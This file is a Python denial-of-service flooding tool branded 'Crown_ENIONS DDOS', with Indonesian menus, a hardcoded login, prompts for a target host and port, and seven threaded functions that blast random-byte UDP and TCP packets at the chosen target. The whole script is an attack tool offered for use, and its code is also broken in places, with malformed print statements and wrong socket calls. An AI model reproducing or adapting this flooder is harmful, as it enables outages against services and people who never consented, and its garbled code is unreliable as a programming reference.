"""
UDP Flooder.
This is a 'Dos' attack program to attack servers, you set the IP always that you have permission to do it.
and the port and the amount of seconds and it will start flooding to that server.
Created by Crown_ENIONS -> https://github.com/Crown_ENIONS/Python-UDP-Flood
Usage : ./flood_udp
Press enter to continue and introduce the data.
"""
import signal
import time
import socket
import random
import threading
import sys
import os
from os import system, name
import datetime
import getpass

from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

def login():
    user = "Crown_ENIONS"
    passwd = "Crown_ENIONS"
    username = input(" 👑\033[1;33;40m Masukan Username Tools 👑: ")
    password = getpass.getpass(prompt='👑 Masukan Password Tools 👑: ')
    if username != user or password != passwd:
        print("")
        print(" 👑\033[1;33;40m Jangan Lupa Support Terus Crown_ENIONS 👑")
        sys.exit(1)
    elif username == user and password == passwd:
        print(" 👑\033[1;33;40m Jika Ada Bug Bisa Lapor Di Discord Crown_ENIONS 👑!")
        time.sleep(0.3)

login()

print("\033[1;34;40m \n")
os.system("figlet DDOS ATTACK -f slant")
print("\033[1;33;40m Jika Anda memiliki masalah, Lapor di https://github.com/Crown_ENIONS/Python-UDP-Flood/issues\n")

print("\033[1;33;40m ===========================  \n")
print("\033[1;32;40m =====> [ Developer Crown_ENIONS ] <======  \n")
print("\033[1;33;40m ===> [ Jangan Abuse Kamu ] <====  \n")
print("\033[1;33;40m =====> [ My Tools DDDOS ] <=====  \n")
print("\033[1;33;40m ===> [ Kalo Mau Rename Pm ] <=====  \n")
print("\033[1;33;40m ===========================  \n")
test = input()
if test == "n":
	exit(0)
	
def menu():
    sys.stdout.write("         \x1b]2;Crown_ENIONS DDOS --> Stars: [{bots}] | Online Users: [1] | Methods: [9999] | Bypass: [9999] | Amps: [9999]\x07")
    print('\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mCrown_ENIONS \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to Crown_ENIONS DDOS! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: Crown_ENIONSr9999 \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate V2')
    print("")
    print("""
                        \x1b[38;2;0;212;14m \x1b[38;2;0;186;45m    \x1b[38;2;0;150;88m   \x1b[38;2;0;113;133m  \x1b[38;2;0;83;168m  \x1b[38;2;0;49;147m 
                        \x1b[38;2;0;212;14m \x1b[38;2;0;186;45m    \x1b[38;2;0;150;88m     \x1b[38;2;0;113;133m   \x1b[38;2;0;83;168m   \x1b[38;2;0;49;147m 
                        \x1b[38;2;0;212;14m \x1b[38;2;0;186;45m    \x1b[38;2;0;150;88m   \x1b[38;2;0;113;133m  \x1b[38;2;0;83;168m  \x1b[38;2;0;49;147m 
                \x1b[38;2;0;212;14m\x1b[38;2;0;186;45m\x1b[38;2;0;150;88m\x1b[38;2;0;113;133m\x1b[38;2;0;83;168m\x1b[38;2;0;49;147m
                \x1b[38;2;0;212;14m          \x1b[38;2;239;239;239mWelcome to Crown_ENIONS DDOS DDoS Panel        \x1b[38;2;0;49;147m
                \x1b[38;2;0;212;14m \x1b[38;2;0;49;147m- - - - - - \x1b[38;2;239;239;239mFree DDoS Panel 2022\x1b[38;2;0;212;14m- - - - - - -\x1b[38;2;0;49;147m
                \x1b[38;2;0;212;14m\x1b[38;2;0;186;45m\x1b[38;2;0;150;88m\x1b[38;2;0;113;133m\x1b[38;2;0;83;168m\x1b[38;2;0;49;147m
                    \x1b[38;2;0;212;14m\x1b[38;2;0;186;45m\x1b[38;2;0;150;88m\x1b[38;2;0;113;133m\x1b[38;2;0;83;168m\x1b[38;2;0;49;147m
                    \x1b[38;2;0;212;14m \x1b[38;2;239;239;239mhttps://github.com/Crown_ENIONS/Crown_ENIONSDDoS \x1b[38;2;0;49;147m
                    \x1b[38;2;0;212;14m\x1b[38;2;0;186;45m\x1b[38;2;0;150;88m\x1b[38;2;0;113;133m\x1b[38;2;0;83;168m\x1b[38;2;0;49;147m
                \x1b[38;2;0;212;14m\x1b[38;2;0;186;45m\x1b[38;2;0;150;88m\x1b[38;2;0;113;133m\x1b[38;2;0;83;168m\x1b[38;2;0;49;147m
                \x1b[38;2;0;212;14m   \x1b[38;2;239;239;239m   Jangan Abuse Kalo Mau Di Pake DDOS.      \x1b[38;2;0;49;147m
                \x1b[38;2;0;212;14m\x1b[38;2;0;186;45m\x1b[38;2;0;150;88m\x1b[38;2;0;113;133m\x1b[38;2;0;83;168m\x1b[38;2;0;49;147m
""")

print("""

 
               
                             
                           
                      
            
                         
                                         
                                                   
                                                        
                                                                   
                                         

""")
	
ip = str(input("\033[1;33;40m [K] Enter Attack Host:"))
port = int(input("\033[1;33;40m [K] Enter Attack Port:"))
choice = str(input("\033[1;32;40 [K] Enter Methods UDP Attack(Attack/n):"))
times = int(input("\033[1;33;40m [K] Enter Attack Packets Connection:"))
threads = int(input("\033[1;33;40 [K] Enter Attack Threads Commection:"))
os.system("clear")

time.sleep(5)
print(" [ =                        ] 0%")
time.sleep(5)
print(" [ =======             ] 25%")
time.sleep(5)
print(" [ =========            ] 50%")
time.sleep(5)
print(" [ ============         ] 75%")
time.sleep(5)
print(" [ ===============     ] 100%")
os.system("clear")

def Attack():
	K_ibytes = random._urandom(5500055)
	data = random._urandom(65500)
	M = random.choice(("[K]","[K]","[K]"))
	while True:
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #UDP = SOCK_DGRAM
			addr = (str(ip),int(port))
			for x in range(times):
				sock.sendto(K_ibytes,addr,data)
			print(M +"MENGIRIM KOPI DAN PERMEN KE TARGET")
		except:
			sock.close()
			print(" [K] MENGIRIM KOPI DAN PERMEN KE TARGET")

def Attack2():
	K_ibytes = random._urandom(550055)
	data = random._urandom(65500)
	M = random.choice(("[K]","[K]","[K]"))
	while True:
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #UDP = SOCK_DGRAM
			addr = (str(ip),int(port))
			for x in range(times):
				sock.sendto(K_ibytes,addr,data)
			print(M +"MENGIRIM KOPI DAN PERMEN KE TARGET")
		except:
			sock.close()
			print(" [K] MENGIRIM KOPI DAN PERMEN KE TARGET")

def Attack3():
	K_ibytes = random._urandom(550055)
	data = random._urandom(65500)
	M = random.choice(("[K]","[K]","[K]"))
	while True:
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #UDP = SOCK_DGRAM
			addr = (str(ip),int(port))
			for x in range(times):
				sock.sendto(K_ibytes,addr,data)
			print(M +"Attack target host and Port % %"(ip(str,port))
		except:
			sock.close()
			print(" [K] Attack Target host and Port % %"(ip(str,port))

def Attack4():
	K_ibytes = random._urandom(550055)
	data = random._urandom(65500)
	M = random.choice(("[K]","[K]","[K]"))
	while True:
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #UDP = SOCK_DGRAM
			addr = (str(ip),int(port))
			for x in range(times):
				sock.sendto(K_ibytes,addr,data)
			print(M +"Attack target host and Port % %"(ip(str,port))
		except:
			sock.close()
			print(" [K] Attack Target host and Port % %"(ip(str,port))

def Attack5():
	K_ibytes = random._urandom(550055)
	data = random._urandom(65500)
	M = random.choice(("[K]","[K]","[K]"))
	while True:
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #UDP = SOCK_DGRAM
			addr = (str(ip),int(port))
			for x in range(times):
				sock.sendto(K_ibytes,addr,data)
			print(M +"Attack target host and Port % %"(ip(str,port))
		except:
			sock.close()
			print(" [K] Attack Target host and Port % %"(ip(str,port))

def Attack6():
	K_ibytes = random._urandom(550055)
	data = random._urandom(400)
	M = random.choice(("[K]","[K]","[K]"))
	while True:
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #UDP = SOCK_DGRAM
			addr = (str(ip),int(port))
			for x in range(times):
				sock.sendto(K_ibytes,addr,data)
			print(M +"Attack target host and Port % %"(ip(str,port))
		except:
			sock.close()
			print(" [K] Attack Target host and Port % %"(ip(str,port))
			
def Attack7():
	K_ibytes = random._urandom(550055)
	data = random._urandom(400)
	M = random.choice(("[K]","[K]","[K]"))
	while True:
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #UDP = SOCK_DGRAM
			addr = (str(ip),int(port))
			for x in range(times):
				sock.sendto(K_ibytes,addr,data)
			print(M +"Attack target host and Port % %"(ip(str,port))
		except:
			sock.close()
			print(" [K] Attack Target host and Port % %"(ip(str,port))
			
for y in range(threads):
	if choice == 'Attack':
			th = threading.Thread(target = Attack)
			th.start()
			th = threading.Thread(target = Attack2)
			th.start()
			th = threading.Thread(target = Attack3)
			th.start()
			th = threading.Thread(target = Attack4)
			th.start()
			th = threading.Thread(target = Attack5)
			th.start()
			th = threading.Thread(target = Attack6)
			th.start()
			th = threading.Thread(target = Attack7)
			th.start()

def new():
	for y in range(threads):
		if choice == 'Attack':
			th = threading.Thread(target = Attack)
			th.start()
			th = threading.Thread(target = Attack2)
			th.start()
			th = threading.Thread(target = Attack3)
			th.start()
			th = threading.Thread(target = Attack4)
			th.start()
			th = threading.Thread(target = Attack5)
			th.start()
			th = threading.Thread(target = Attack6)
			th.start()
			th = threading.Thread(target = Attack7)
			th.start()
			
def whereuwere():
    print("Aww man, I'm so sorry, but I can't remember if u were in TCP or UDP")
    print("Put 1 for UDP and 2 for TCP")
    whereman = str(input(" 1 or 2 >:("))
    if whereman == '1':
        Attack()
        Attack2()
        Attack3()
        Attack4()
        Attack5()
        Attack6()
        Attack7()

def clear():
    if name == 'nt':
        _ = system('cls')
    else:
        _ = system('clear')

def byebye():
	clear()
	os.system("figlet Youre Leaving Sir -f slant")
	sys.exit(130)

def exit_gracefully(signum, frame):
    # restore the original signal handler
    signal.signal(signal.SIGINT, original_sigint)

    try:
        exitc = str(input(" Jika Kamu Ingin Keluar Ketik y <3 ?:"))
        if exitc == 'y':

            byebye()

    except KeyboardInterrupt:
        print("Ok ok")
        byebye()

    # restore the gracefully exit handler
    signal.signal(signal.SIGINT, exit_gracefully)

if __name__ == '__main__':
    # store SIGINT handler
    original_sigint = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, exit_gracefully)
